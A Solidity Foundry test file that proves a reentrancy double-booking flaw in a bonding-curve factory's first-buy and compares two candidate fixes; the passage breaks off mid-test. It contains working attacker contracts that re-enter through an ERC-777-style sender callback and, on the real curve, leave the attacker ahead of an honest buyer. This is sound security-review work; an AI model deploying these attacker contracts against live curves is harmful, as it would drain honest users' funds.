// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.26;

/**
 * F1 — THE FIX, WRITTEN AND PROVED.
 *
 * `DokuFactory._firstBuy` measures a balance delta ACROSS a `transferFrom` it makes itself
 * (`src/DokuFactory.sol:338-343`). A quote asset that calls the PAYER back during that transfer —
 * every ERC-777, because the standard mandates a `tokensToSend` notification to the sender — lets
 * the payer re-enter `curve.buyWithToken()` inside the measurement window. The inner buy is then
 * booked twice: once correctly by the curve, once again inside `arrived`. `buyFor` and
 * `buyWithToken` are both `nonReentrant` and it does not help, because NO CURVE FUNCTION IS ON THE
 * STACK while the factory does the transfer.
 *
 * Two candidate fixes were on the table for generation 4:
 *
 *   A — the clamp:  `if (arrived > p.firstBuyQuote) arrived = p.firstBuyQuote;`
 *   B — the pull:   the curve pulls from the payer itself, inside its own `nonReentrant`, and
 *                   prices the delta it measured there. `BondingCurve._pullAndBuy` already does
 *                   exactly this and is already immune.
 *
 * Nothing in `src/` is touched — the live contracts are immutable, and this is a design for the
 * NEXT deployment. The evidence comes in two layers:
 *
 *   LAYER 1, "the model" — `Gen4Curve` / `Gen4Factory` below: minimal stand-ins with the same
 *   inbound accounting as the real pair and NO fees or taxes at all, so the only thing a number
 *   can be moved by is the double-book. All THREE arms (today / A / B) run in this layer, which is
 *   the only place an apples-to-apples three-way comparison is possible: candidate B changes the
 *   CURVE, and the deployed curve cannot be changed.
 *
 *   LAYER 2, "the real curve" — `RealFirstBuyFactory` clones the REAL `BondingCurve` and
 *   `DokuToken` and initialises them, so it becomes `curve.factory` and may call the real
 *   `buyFor`. Today's `_firstBuy` and candidate A are both reachable this way, against the real
 *   levy split, the real anti-sniper tax and the real `sell`. That is where A's residue is
 *   measured, and where B's MECHANISM (a pull inside the curve's own guard) is measured on live
 *   code through `buyWithToken`.
 *
 * `vm.getBlockTimestamp()` wherever a warped clock is read: `via_ir = true` folds `block.timestamp`
 * past a warp.
 */

import {Test} from "forge-std/Test.sol";
import {ERC20} from "openzeppelin/token/ERC20/ERC20.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";
import {SafeERC20} from "openzeppelin/token/ERC20/utils/SafeERC20.sol";
import {ReentrancyGuard} from "openzeppelin/utils/ReentrancyGuard.sol";
import {Clones} from "openzeppelin/proxy/Clones.sol";

import {BondingCurve} from "../../src/BondingCurve.sol";
import {DokuToken} from "../../src/DokuToken.sol";
import {Sinks} from "../../src/lib/Sinks.sol";

// =============================================================================================
//                                        THE QUOTE ASSET
// =============================================================================================

interface ITokensToSend {
    function tokensToSend(address from, address to, uint256 amount) external;
}

/**
 * @dev One token, two independently switchable hostile properties, because the whole question
 *      between A and B is which COMBINATION each survives.
 *
 *      1. A sender callback. ERC-777 §tokensToSend: notify the payer before moving their balance.
 *         The token is not the attacker here — an address opts ITSELF in, exactly as an ERC-777
 *         sender registers itself with ERC-1820, and the hostile party is the payer.
 *      2. A transfer fee. `feeBps` of every non-mint transfer is diverted to `feeSink`.
 *
 *      Neither is exotic and neither is refused by `QuoteRegistry.register`, which reads
 *      `decimals()` and nothing else.
 */
contract CallbackQuote is ERC20 {
    mapping(address => bool) public senderHook;
    uint16 public feeBps;
    address public feeSink;
    /// @dev An ERC-777 implementation that wraps its own notification in a try/catch. Present so
    ///      candidate B can be shown SETTLING correctly rather than only reverting.
    bool public swallowHookReverts;
    /// @notice How many times the sender notification has been made.
    /// @dev Counted HERE and not in the payer, because when the notification reverts and this
    ///      contract swallows it, every storage write the payer made inside that frame is unwound
    ///      with it. A flag set by the hook would read false in exactly the case worth proving.
    uint256 public hookCalls;

    constructor() ERC20("Callback Quote", "CBQ") {}

    function decimals() public pure override returns (uint8) {
        return 6;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function setSenderHook(bool on) external {
        senderHook[msg.sender] = on;
    }

    function setFee(uint16 bps, address sink) external {
        feeBps = bps;
        feeSink = sink;
    }

    function setSwallowHookReverts(bool on) external {
        swallowHookReverts = on;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        if (senderHook[from]) {
            ++hookCalls;
            if (swallowHookReverts) {
                try ITokensToSend(from).tokensToSend(from, to, amount) {} catch {}
            } else {
                ITokensToSend(from).tokensToSend(from, to, amount);
            }
        }
        return super.transferFrom(from, to, amount);
    }

    function _update(address from, address to, uint256 value) internal override {
        uint256 fee;
        if (from != address(0) && to != address(0) && feeBps != 0 && feeSink != address(0) && to != feeSink) {
            fee = (value * feeBps) / 10_000;
        }
        if (fee == 0) {
            super._update(from, to, value);
        } else {
            super._update(from, feeSink, fee);
            super._update(from, to, value - fee);
        }
    }
}

// =============================================================================================
//                          LAYER 1 — the model: all three arms, no fees
// =============================================================================================

contract Gen4Token is ERC20 {
    constructor(address curve) ERC20("Gen4", "G4") {
        _mint(curve, 1_000_000_000e18);
    }
}

/**
 * @dev The curve, reduced to the parts F1 can move: a constant-product virtual reserve, ONE
 *      `nonReentrant` guard per external entry, and `booked` — the running total of quote the
 *      curve believes it has been paid.
 *
 *      No fee, no anti-sniper tax, no sink. Deliberately: with them, a discrepancy between
 *      `booked` and the balance could be rounding, and the whole point of this file is that it is
 *      not. `solvency()` is therefore exact in every arm, and any non-zero value is the bug.
 *
 *      Two factory-only entries, which are the two candidates:
 *        `buyForPush` — generations 1-3. The factory has already moved the money and is trusted to
 *                       have measured it. This is `BondingCurve.buyFor` as deployed.
 *        `buyForPull` — candidate B. The curve pulls from the payer and prices its OWN delta, so
 *                       the measurement window sits inside the guard.
 */
contract Gen4Curve is ReentrancyGuard {
    using SafeERC20 for IERC20;

    error NotFactory();
    error AlreadyInitialised();
    error ZeroAmount();
    error Expired();
    error InsufficientOutput();
    /// @dev Candidate B's home for the factory's `FirstBuyDeliveredNothing`.
    error FirstBuyDeliveredNothing();

    address public factory;
    IERC20 public token;
    IERC20 public quote;
    uint256 public vBase;
    uint256 public vQuote;
    /// @notice Quote this curve has credited to somebody. Its whole liability.
    uint256 public booked;
    bool private _initialised;

    constructor() {
        _initialised = true;
    }

    function initialize(address token_, address quote_, uint256 target) external {
        if (_initialised) revert AlreadyInitialised();
        _initialised = true;
        factory = msg.sender;
        token = IERC20(token_);
        quote = IERC20(quote_);
        // Same shape as the real curve: base ceiling fixed by supply, quote floor 2/5 of target.
        vBase = 1_088_888_889_200_000_000_000_000_000;
        vQuote = (target * 2) / 5;
    }

    /// @notice What the curve holds MINUS what it owes. Zero or positive is solvent.
    function solvency() external view returns (int256) {
        return int256(quote.balanceOf(address(this))) - int256(booked);
    }

    // ------------------------------------------------------------------- the two candidate shapes

    function buyForPush(address recipient, uint256 quoteIn, uint256 minOut, uint256 deadline)
        external
        nonReentrant
        returns (uint256)
    {
        if (msg.sender != factory) revert NotFactory();
        return _buy(recipient, quoteIn, minOut, deadline);
    }

    /// @dev The payer is the RECIPIENT, not a third party the factory names — so the signature is
    ///      the one `BondingCurve.buyFor` already has. That is deliberate and it is the difference
    ///      between a fix and a new hole: a `payer` parameter would let the factory spend any
    ///      account's allowance TO THIS CURVE on somebody else's behalf, and every ordinary trader
    ///      grants the curve exactly that allowance to use `buyWithToken`. Fused, the worst a
    ///      future factory bug can do is buy a victim tokens with the victim's own money.
    function buyForPull(address recipient, uint256 quoteIn, uint256 minOut, uint256 deadline)
        external
        nonReentrant
        returns (uint256)
    {
        if (msg.sender != factory) revert NotFactory();
        uint256 held = quote.balanceOf(address(this));
        quote.safeTransferFrom(recipient, address(this), quoteIn);
        uint256 arrived = quote.balanceOf(address(this)) - held;
        if (arrived == 0) revert FirstBuyDeliveredNothing();
        return _buy(recipient, arrived, minOut, deadline);
    }

    // ------------------------------------------------------------------------ the ordinary entries

    function buyWithToken(uint256 quoteIn, uint256 minOut, uint256 deadline) external nonReentrant returns (uint256) {
        uint256 held = quote.balanceOf(address(this));
        quote.safeTransferFrom(msg.sender, address(this), quoteIn);
        uint256 arrived = quote.balanceOf(address(this)) - held;
        if (arrived == 0) revert ZeroAmount();
        return _buy(msg.sender, arrived, minOut, deadline);
    }

    function sell(uint256 baseIn, uint256 minQuoteOut, uint256 deadline) external nonReentrant returns (uint256 out) {
        if (block.timestamp > deadline) revert Expired();
        uint256 k = vBase * vQuote;
        uint256 nb = vBase + baseIn;
        uint256 nq = k / nb;
        out = vQuote - nq;
        if (out < minQuoteOut) revert InsufficientOutput();
        vBase = nb;
        vQuote = nq;
        booked -= out;
        token.safeTransferFrom(msg.sender, address(this), baseIn);
        quote.safeTransfer(msg.sender, out);
    }

    function _buy(address recipient, uint256 gross, uint256 minOut, uint256 deadline) private returns (uint256 out) {
        if (block.timestamp > deadline) revert Expired();
        if (gross == 0) revert ZeroAmount();
        uint256 k = vBase * vQuote;
        uint256 nq = vQuote + gross;
        uint256 nb = k / nq;
        out = vBase - nb;
        if (out < minOut) revert InsufficientOutput();
        vBase = nb;
        vQuote = nq;
        booked += gross;
        token.safeTransfer(recipient, out);
    }
}

/// @dev The three `_firstBuy` shapes, selected at construction. `TODAY` is `src/DokuFactory.sol`
///      lines 338-343 verbatim; `CLAMP` is those lines plus the one the writeup proposes; `PULL`
///      is candidate B, where the factory moves no money at all.
contract Gen4Factory {
    using SafeERC20 for IERC20;

    enum Mode {
        TODAY,
        CLAMP,
        PULL
    }

    error FirstBuyDeliveredNothing();

    address public immutable curveImplementation;
    Mode public immutable mode;
    uint256 public immutable target;
    mapping(address => uint256) public nonces;

    constructor(Mode mode_, uint256 target_) {
        mode = mode_;
        target = target_;
        curveImplementation = address(new Gen4Curve());
    }

    function predictCurve(address creator) external view returns (address) {
        bytes32 salt = keccak256(abi.encode(creator, nonces[creator]));
        return Clones.predictDeterministicAddress(curveImplementation, salt, address(this));
    }

    function launch(address quoteAsset, uint256 firstBuyQuote) external returns (address curve, address token) {
        bytes32 salt = keccak256(abi.encode(msg.sender, nonces[msg.sender]++));
        curve = Clones.cloneDeterministic(curveImplementation, salt);
        token = address(new Gen4Token(curve));
        Gen4Curve(curve).initialize(token, quoteAsset, target);
        if (firstBuyQuote != 0) _firstBuy(quoteAsset, curve, firstBuyQuote);
    }

    function _firstBuy(address quoteAsset, address curve, uint256 firstBuyQuote) private {
        Gen4Curve c = Gen4Curve(curve);
        if (mode == Mode.PULL) {
            // CANDIDATE B. No transfer here; the curve pulls from the creator inside its own guard.
            c.buyForPull(msg.sender, firstBuyQuote, 0, type(uint256).max);
            return;
        }
        IERC20 q = IERC20(quoteAsset);
        uint256 before = q.balanceOf(curve);
        q.safeTransferFrom(msg.sender, curve, firstBuyQuote);
        uint256 arrived = q.balanceOf(curve) - before;
        // CANDIDATE A, and the only line that differs from what is deployed.
        if (mode == Mode.CLAMP && arrived > firstBuyQuote) arrived = firstBuyQuote;
        if (arrived == 0) revert FirstBuyDeliveredNothing();
        c.buyForPush(msg.sender, arrived, 0, type(uint256).max);
    }
}

/// @dev The launch creator. Hostile; the token is not.
contract Gen4Attacker is ITokensToSend {
    Gen4Factory public immutable factory;
    CallbackQuote public immutable quote;
    address public curve;
    uint256 public inner;
    bool public armed;
    bool public fired;

    constructor(Gen4Factory f, CallbackQuote q) {
        factory = f;
        quote = q;
        q.setSenderHook(true);
    }

    function launch(uint256 firstBuy, uint256 inner_) external returns (address, address) {
        curve = factory.predictCurve(address(this));
        inner = inner_;
        armed = true;
        fired = false;
        // BOTH approvals, so the same fixture runs against all three arms: today and the clamp
        // spend the factory's allowance, candidate B spends the curve's. A hook has no room to
        // approve inside its own callback, so the inner buy's allowance is set here either way.
        quote.approve(address(factory), type(uint256).max);
        quote.approve(curve, type(uint256).max);
        return factory.launch(address(quote), firstBuy);
    }

    function tokensToSend(address, address, uint256) external override {
        if (!armed || fired || inner == 0) return;
        fired = true;
        Gen4Curve(curve).buyWithToken(inner, 0, type(uint256).max);
    }
}

// =============================================================================================
//              LAYER 2 — the real curve: today's `_firstBuy` and candidate A on live code
// =============================================================================================

/**
 * @dev A stand-in factory that deploys the REAL `BondingCurve` and `DokuToken` exactly as
 *      `DokuFactory._deploy` does, so `curve.factory` is this contract and the real `buyFor` is
 *      reachable. Everything about the market — the 1% fee, the 50% anti-sniper tax at t=0, the
 *      REWARDS sink, `sell`, `release` — is the deployed code.
 *
 *      Only two of the three arms fit here. Candidate B changes `BondingCurve.buyFor`, and this
 *      file may not change `src/`; its mechanism is measured instead through the real
 *      `buyWithToken`, which is the same pull inside the same guard.
 */
contract RealFirstBuyFactory {
    using SafeERC20 for IERC20;

    enum Mode {
        TODAY,
        CLAMP
    }

    error FirstBuyDeliveredNothing();

    address public immutable curveImplementation;
    address public immutable tokenImplementation;
    Mode public immutable mode;
    uint256 public immutable target;
    address public immutable graduator;
    address public immutable protocolRecipient;
    address public immutable creatorSink;
    mapping(address => uint256) public nonces;

    constructor(Mode mode_, uint256 target_, address graduator_, address protocolRecipient_, address creatorSink_) {
        mode = mode_;
        target = target_;
        graduator = graduator_;
        protocolRecipient = protocolRecipient_;
        creatorSink = creatorSink_;
        curveImplementation = address(new BondingCurve());
        tokenImplementation = address(new DokuToken());
    }

    function predictCurve(address creator) external view returns (address) {
        bytes32 salt = keccak256(abi.encode(creator, nonces[creator]));
        return Clones.predictDeterministicAddress(curveImplementation, salt, address(this));
    }

    function launch(address quoteAsset, uint256 firstBuyQuote) external returns (address curve, address token) {
        bytes32 salt = keccak256(abi.encode(msg.sender, nonces[msg.sender]++));
        curve = Clones.cloneDeterministic(curveImplementation, salt);
        token = Clones.cloneDeterministic(tokenImplementation, salt);
        DokuToken(token).initialize("Gen4 Real", "G4R", curve, false, "https://cdn.doku.family/metadata/test.json");
        BondingCurve(payable(curve))
            .initialize(
                token,
                quoteAsset,
                target,
                Sinks.REWARDS,
                address(0),
                0,
                address(0),
                protocolRecipient,
                graduator,
                creatorSink
            );
        if (firstBuyQuote != 0) _firstBuy(quoteAsset, curve, firstBuyQuote);
    }

    /// @dev `src/DokuFactory.sol:338-343`, with candidate A's one line behind a flag.
    function _firstBuy(address quoteAsset, address curve, uint256 firstBuyQuote) private {
        BondingCurve c = BondingCurve(payable(curve));
        IERC20 q = IERC20(quoteAsset);
        uint256 before = q.balanceOf(curve);
        q.safeTransferFrom(msg.sender, curve, firstBuyQuote);
        uint256 arrived = q.balanceOf(curve) - before;
        if (mode == Mode.CLAMP && arrived > firstBuyQuote) arrived = firstBuyQuote;
        if (arrived == 0) revert FirstBuyDeliveredNothing();
        c.buyFor(msg.sender, arrived, 0, type(uint256).max);
    }
}

/// @dev The launch creator against the real curve.
contract RealAttacker is ITokensToSend {
    RealFirstBuyFactory public immutable factory;
    CallbackQuote public immutable quote;
    address public curve;
    uint256 public inner;
    bool public armed;
    bool public fired;

    constructor(RealFirstBuyFactory f, CallbackQuote q) {
        factory = f;
        quote = q;
        q.setSenderHook(true);
    }

    function launch(uint256 firstBuy, uint256 inner_) external returns (address, address) {
        curve = factory.predictCurve(address(this));
        inner = inner_;
        armed = true;
        fired = false;
        quote.approve(address(factory), type(uint256).max);
        quote.approve(curve, type(uint256).max);
        return factory.launch(address(quote), firstBuy);
    }

    function tokensToSend(address, address, uint256) external override {
        if (!armed || fired || inner == 0) return;
        fired = true;
        BondingCurve(payable(curve)).buyWithToken(inner, 0, type(uint256).max);
    }

    /// @dev The same hook pointed at the curve's OWN inbound leg — candidate B's mechanism,
    ///      running on deployed code.
    function rearm(address curve_, uint256 inner_) external {
        curve = curve_;
        inner = inner_;
        armed = true;
        fired = false;
        quote.approve(curve_, type(uint256).max);
    }

    function setArmed(bool on) external {
        armed = on;
    }

    function directBuy(uint256 amount) external returns (uint256) {
        return BondingCurve(payable(curve)).buyWithToken(amount, 0, type(uint256).max);
    }

    function sellAll(address token_) external returns (uint256) {
        uint256 bal = IERC20(token_).balanceOf(address(this));
        IERC20(token_).approve(curve, bal);
        return BondingCurve(payable(curve)).sell(bal, 0, type(uint256).max);
    }
}

// =============================================================================================
//                          LAYER 1 TESTS — today vs A vs B, side by side
// =============================================================================================

contract Gen4ModelTest is Test {
    CallbackQuote internal quote;
    address internal constant FEESINK = address(0xFEE5);
    address internal constant BOB = address(0xB0B);

    uint256 internal constant TARGET = 8_000e6;
    uint256 internal constant FIRST = 1_000e6;
    uint256 internal constant INNER = 1_000e6;
    uint16 internal constant FEE_BPS = 500; // 5%

    function setUp() public {
        quote = new CallbackQuote();
    }

    function _arm(Gen4Factory.Mode m) internal returns (Gen4Factory f, Gen4Attacker atk) {
        f = new Gen4Factory(m, TARGET);
        atk = new Gen4Attacker(f, quote);
        quote.mint(address(atk), 1_000_000e6);
    }

    // ------------------------------------------------------------------- plain callback, no fee

    /// @dev The control for everything below: what is DEPLOYED, attacked with a plain sender
    ///      callback. The inner buy is booked twice and the shortfall is the whole of it.
    function test_model_today_plainCallback_overBooksTheWholeInnerBuy() public {
        (, Gen4Attacker atk) = _arm(Gen4Factory.Mode.TODAY);
        (address curveAddr,) = atk.launch(FIRST, INNER);
        Gen4Curve c = Gen4Curve(curveAddr);

        assertTrue(atk.fired(), "the callback never ran - the fixture proves nothing");
        assertEq(quote.balanceOf(curveAddr), FIRST + INNER, "the curve holds what was really sent");
        assertEq(c.booked(), FIRST + 2 * INNER, "the inner buy was not booked twice");
        assertEq(c.solvency(), -int256(INNER), "the shortfall is not the whole inner buy");
    }

    /// @dev CANDIDATE A against the plain callback: exact. This is the case the writeup's clamp
    ///      was written for, and against this case it is a complete fix.
    function test_model_clampA_plainCallback_isExact() public {
        (, Gen4Attacker atk) = _arm(Gen4Factory.Mode.CLAMP);
        (address curveAddr,) = atk.launch(FIRST, INNER);
        Gen4Curve c = Gen4Curve(curveAddr);

        assertTrue(atk.fired(), "the callback never ran - the fixture proves nothing");
        assertEq(quote.balanceOf(curveAddr), FIRST + INNER, "the curve holds what was really sent");
        assertEq(c.booked(), FIRST + INNER, "the clamp did not stop the double-book");
        assertEq(c.solvency(), int256(0), "the clamp left the curve insolvent on a plain callback");
    }

    /// @dev CANDIDATE B against the plain callback: the attack does not fail quietly, it does not
    ///      execute at all. The pull is inside the curve's guard, so the re-entrant `buyWithToken`
    ///      hits `ReentrancyGuardReentrantCall` and the whole launch unwinds. Nothing is deployed,
    ///      nothing is booked, no money moved.
    function test_model_pullB_plainCallback_bouncesOffTheGuard() public {
        (, Gen4Attacker atk) = _arm(Gen4Factory.Mode.PULL);
        uint256 before = quote.balanceOf(address(atk));
        vm.expectRevert(); // ReentrancyGuardReentrantCall, raised inside the token's callback
        atk.launch(FIRST, INNER);
        assertEq(quote.balanceOf(address(atk)), before, "a refused launch still moved money");
    }

    /// @dev CANDIDATE B against a token that swallows its own notification's revert — the version
    ///      of the attack that SETTLES rather than reverting. The launch succeeds and books
    ///      exactly what the curve measured inside its own guard.
    function test_model_pullB_plainCallback_settlesOnTheTruthWhenTheTokenSwallows() public {
        quote.setSwallowHookReverts(true);
        (, Gen4Attacker atk) = _arm(Gen4Factory.Mode.PULL);
        (address curveAddr,) = atk.launch(FIRST, INNER);
        Gen4Curve c = Gen4Curve(curveAddr);

        assertEq(quote.hookCalls(), 1, "the callback never ran - the fixture proves nothing");
        assertFalse(atk.fired(), "the inner buy did not revert - it was not the guard that stopped it");
        assertEq(quote.balanceOf(curveAddr), FIRST, "the inner buy got through the guard");
        assertEq(c.booked(), FIRST, "the curve booked something other than what it pulled");
        assertEq(c.solvency(), int256(0), "candidate B left the curve insolvent");
    }

    // ------------------------------------------------- fee-on-transfer + callback: the divider

    /// @dev Today's code, both properties on. Still insolvent, by the whole of what the inner buy
    ///      actually delivered.
    function test_model_today_feeOnTransferPlusCallback_overBooks() public {
        quote.setFee(FEE_BPS, FEESINK);
        (, Gen4Attacker atk) = _arm(Gen4Factory.Mode.TODAY);
        (address curveAddr,) = atk.launch(FIRST, INNER);
        Gen4Curve c = Gen4Curve(curveAddr);

        uint256 innerArrived = INNER - (INNER * FEE_BPS) / 10_000;
        assertTrue(atk.fired(), "the callback never ran - the fixture proves nothing");
        assertEq(c.solvency(), -int256(innerArrived), "the shortfall is not the inner delivery");
    }

    /**
     * THE CLAIM UNDER TEST, AND IT IS TRUE.
     *
     * A prior review said candidate A "still leaks on a token that is both fee-on-transfer and
     * callback-bearing: actual arrival 0.95a, clamped to a, over-books 0.05a". Measured here at
     * a = 1,000e6 and a 5% fee: the curve ends 50e6 short, which is exactly 5% of the first buy.
     *
     * The mechanism, precisely. The clamp's ceiling is `firstBuyQuote`, which is what the payer
     * was ASKED for; the money that actually reached the curve on the outer leg is
     * `firstBuyQuote - fee`. Any reentrant delivery at all lifts the measured delta over the
     * ceiling, the clamp pins it to the ceiling, and the difference between the ceiling and the
     * real outer arrival is booked against money nobody sent. The clamp bounds the lie; it does
     * not remove it.
     */
    function test_model_clampA_feeOnTransferPlusCallback_LEAKS_exactlyTheTransferFee() public {
        quote.setFee(FEE_BPS, FEESINK);
        (, Gen4Attacker atk) = _arm(Gen4Factory.Mode.CLAMP);
        (address curveAddr,) = atk.launch(FIRST, INNER);
        Gen4Curve c = Gen4Curve(curveAddr);

        uint256 fee = (FIRST * FEE_BPS) / 10_000;
        uint256 outerArrived = FIRST - fee;
        uint256 innerArrived = INNER - (INNER * FEE_BPS) / 10_000;

        assertTrue(atk.fired(), "the callback never ran - the fixture proves nothing");
        assertEq(quote.balanceOf(curveAddr), outerArrived + innerArrived, "the curve holds something else");
        assertEq(c.booked(), FIRST + innerArrived, "the clamp did not pin the delta to firstBuyQuote");
        assertEq(c.solvency(), -int256(fee), "candidate A did NOT leak - the review's claim is refuted");
        emit log_named_uint("candidate A residue, raw units", fee);
    }

    /// @dev CANDIDATE B, both properties on: the launch does not happen at all.
    function test_model_pullB_feeOnTransferPlusCallback_bouncesOffTheGuard() public {
        quote.setFee(FEE_BPS, FEESINK);
        (, Gen4Attacker atk) = _arm(Gen4Factory.Mode.PULL);
        uint256 before = quote.balanceOf(address(atk));
        vm.expectRevert();
        atk.launch(FIRST, INNER);
        assertEq(quote.balanceOf(address(atk)), before, "a refused launch still moved money");
    }

    /// @dev CANDIDATE B, both properties on, against a token that swallows the revert: settles,
    ///      and books the fee-reduced amount that actually arrived. Solvent to the wei.
    function test_model_pullB_feeOnTransferPlusCallback_staysExact() public {
        quote.setFee(FEE_BPS, FEESINK);
        quote.setSwallowHookReverts(true);
        (, Gen4Attacker atk) = _arm(Gen4Factory.Mode.PULL);
        (address curveAddr,) = atk.launch(FIRST, INNER);
        Gen4Curve c = Gen4Curve(curveAddr);

        uint256 outerArrived = FIRST - (FIRST * FEE_BPS) / 10_000;
        assertEq(quote.hookCalls(), 1, "the callback never ran - the fixture proves nothing");
        assertFalse(atk.fired(), "the inner buy did not revert - it was not the guard that stopped it");
        assertEq(quote.balanceOf(curveAddr), outerArrived, "the inner buy got through the guard");
        assertEq(c.booked(), outerArrived, "the curve booked more than it pulled");
        assertEq(c.solvency(), int256(0), "candidate B left the curve insolvent");
    }

    // ------------------------------------------------------------------ neither ingredient alone

    /// @dev The other control, and it is what stops the test above being read as "A is broken by
    ///      fee-on-transfer". It is not. A fee-on-transfer quote with NO callback under-delivers,
    ///      the delta measures the under-delivery correctly, the clamp never bites, and every arm
    ///      including today's is exact. It takes BOTH properties.
    function test_model_feeOnTransferAlone_isHandledCorrectlyByEveryArm() public {
        quote.setFee(FEE_BPS, FEESINK);
        uint256 arrived = FIRST - (FIRST * FEE_BPS) / 10_000;

        (, Gen4Attacker a1) = _arm(Gen4Factory.Mode.TODAY);
        (address c1,) = a1.launch(FIRST, 0);
        assertFalse(a1.fired(), "the control arm re-entered after all");
        assertEq(Gen4Curve(c1).booked(), arrived, "today mis-booked a plain fee-on-transfer");
        assertEq(Gen4Curve(c1).solvency(), int256(0), "today was insolvent on a plain fee-on-transfer");

        (, Gen4Attacker a2) = _arm(Gen4Factory.Mode.CLAMP);
        (address c2,) = a2.launch(FIRST, 0);
        assertEq(Gen4Curve(c2).booked(), arrived, "the clamp mis-booked a plain fee-on-transfer");
        assertEq(Gen4Curve(c2).solvency(), int256(0), "the clamp was insolvent on a plain fee-on-transfer");

        (, Gen4Attacker a3) = _arm(Gen4Factory.Mode.PULL);
        (address c3,) = a3.launch(FIRST, 0);
        assertEq(Gen4Curve(c3).booked(), arrived, "candidate B mis-booked a plain fee-on-transfer");
        assertEq(Gen4Curve(c3).solvency(), int256(0), "candidate B was insolvent on a plain fee-on-transfer");
    }

    /// @dev And the honest launch is unchanged by candidate B: no hook, no fee, same market.
    function test_model_pullB_theHonestLaunchIsUnchanged() public {
        (, Gen4Attacker honest) = _arm(Gen4Factory.Mode.PULL);
        (address ch,) = honest.launch(FIRST, 0);
        (, Gen4Attacker today) = _arm(Gen4Factory.Mode.TODAY);
        (address ct,) = today.launch(FIRST, 0);

        assertEq(Gen4Curve(ch).booked(), Gen4Curve(ct).booked(), "candidate B books a different amount");
        assertEq(Gen4Curve(ch).vBase(), Gen4Curve(ct).vBase(), "candidate B prices the launch differently");
        assertEq(quote.balanceOf(ch), quote.balanceOf(ct), "candidate B moved a different amount of quote");
    }

    // ----------------------------------------------------------------------- the general formula

    /**
     * The two residues, as closed forms, across the whole parameter space rather than at one
     * point. With `f(x)` the transfer fee on `x`:
     *
     *   TODAY:  insolvency = INNER - f(INNER)          — the whole reentrant delivery, unbounded
     *   A:      insolvency = min(INNER - f(INNER), f(FIRST))
     *   B:      insolvency = 0                          — by construction, so it is not fuzzed here
     *                                                     (the attack cannot execute at all)
     *
     * A's residue is therefore CAPPED at the transfer fee on the first buy, which is the honest
     * statement of how much better A is than nothing — and it is zero if and only if the quote
     * charges no fee, which is a property of an asset the registry cannot check.
     */
    /// forge-config: default.fuzz.runs = 192
    function testFuzz_model_theResidueOfEachCandidate(uint96 first_, uint96 inner_, uint16 bps_) public {
        // Up to a whole target each. Above that the model's virtual base ceiling would price out
        // more token than the 1e27 supply behind it — an artefact of the model having no
        // target-fill refund, not of anything F1 touches.
        uint256 first = bound(uint256(first_), 1e6, TARGET);
        uint256 inner = bound(uint256(inner_), 1e6, TARGET);
        uint256 bps = bound(uint256(bps_), 0, 2_000);
        if (bps != 0) quote.setFee(uint16(bps), FEESINK);

        uint256 innerArrived = inner - (inner * bps) / 10_000;
        uint256 firstFee = (first * bps) / 10_000;

        (, Gen4Attacker a1) = _arm(Gen4Factory.Mode.TODAY);
        quote.mint(address(a1), 1_000_000e6);
        (address c1,) = a1.launch(first, inner);
        assertEq(Gen4Curve(c1).solvency(), -int256(innerArrived), "today's residue is not the inner delivery");

        (, Gen4Attacker a2) = _arm(Gen4Factory.Mode.CLAMP);
        quote.mint(address(a2), 1_000_000e6);
        (address c2,) = a2.launch(first, inner);
        uint256 expectedA = innerArrived < firstFee ? innerArrived : firstFee;
        assertEq(Gen4Curve(c2).solvency(), -int256(expectedA), "candidate A's residue is not min(inner, fee)");
    }
}

// =============================================================================================
//        LAYER 2 TESTS — today and candidate A on the REAL curve, and B's mechanism on it
// =============================================================================================

contract Gen4RealCurveTest is Test {
    CallbackQuote internal quote;

    address internal constant GRADUATOR = address(0x6DAD);
    address internal constant TREASURY = address(0xA2);
    address internal constant CREATOR_SINK = address(0x5111);
    address internal constant FEESINK = address(0xFEE5);
    address internal constant BOB = address(0xB0B);

    uint256 internal constant TARGET = 8_000e6;
    uint256 internal constant FIRST = 1_000e6;
    uint256 internal constant INNER = 1_000e6;
    uint16 internal constant FEE_BPS = 500; // 5%

    function setUp() public {
        quote = new CallbackQuote();
    }

    function _arm(RealFirstBuyFactory.Mode m) internal returns (RealAttacker atk) {
        RealFirstBuyFactory f = new RealFirstBuyFactory(m, TARGET, GRADUATOR, TREASURY, CREATOR_SINK);
        atk = new RealAttacker(f, quote);
        quote.mint(address(atk), 1_000_000e6);
    }

    /// @dev Everything the curve believes it has been paid and has not yet paid out.
    function _booked(BondingCurve c) internal view returns (uint256) {
        return c.quoteRaised() + c.pendingProtocol() + c.pendingFees() + c.pendingTax();
    }

    function _shortfall(BondingCurve c) internal view returns (int256) {
        return int256(_booked(c)) - int256(quote.balanceOf(address(c)));
    }

    // ------------------------------------------------------------------------------ today

    /// @dev The finding, on the deployed curve, reached through a factory that runs
    ///      `src/DokuFactory.sol:338-343` unchanged. Same shortfall as the model predicts.
    function test_real_today_overBooksTheWholeInnerBuy() public {
        RealAttacker atk = _arm(RealFirstBuyFactory.Mode.TODAY);
        (address curveAddr,) = atk.launch(FIRST, INNER);
        BondingCurve c = BondingCurve(payable(curveAddr));

        assertTrue(atk.fired(), "the callback never ran - the fixture proves nothing");
        assertEq(quote.balanceOf(curveAddr), FIRST + INNER, "the curve holds what was really sent");
        assertEq(_booked(c), FIRST + 2 * INNER, "the inner buy was not booked twice");
        assertEq(_shortfall(c), int256(INNER), "the shortfall is not the whole inner buy");
    }

    /**
     * @dev The severity, measured on the real curve rather than asserted: the attacker walks with
     *      more than they staked and the honest buyer cannot get theirs back. This is the number
     *      the fix has to remove — a fix that only stopped the FREEZE would leave it standing.
     */
    function test_real_today_theAttackerLeavesAheadAndTheHonestBuyerDoesNot() public {
        RealAttacker atk = _arm(RealFirstBuyFactory.Mode.TODAY);
        uint256 before = quote.balanceOf(address(atk));
        (address curveAddr, address tokenAddr) = atk.launch(FIRST, INNER);
        BondingCurve c = BondingCurve(payable(curveAddr));
        uint256 spent = before - quote.balanceOf(address(atk));

        vm.warp(vm.getBlockTimestamp() + c.TAX_WINDOW() + 1);
        vm.roll(block.number + 1);

        uint256 honest_ = 3_000e6;
        quote.mint(BOB, honest_);
        vm.startPrank(BOB);
        quote.approve(curveAddr, type(uint256).max);
        c.buyWithToken(honest_, 0, type(uint256).max);
        vm.stopPrank();

        atk.sellAll(tokenAddr);
        uint256 recovered = quote.balanceOf(address(atk)) - (before - spent);

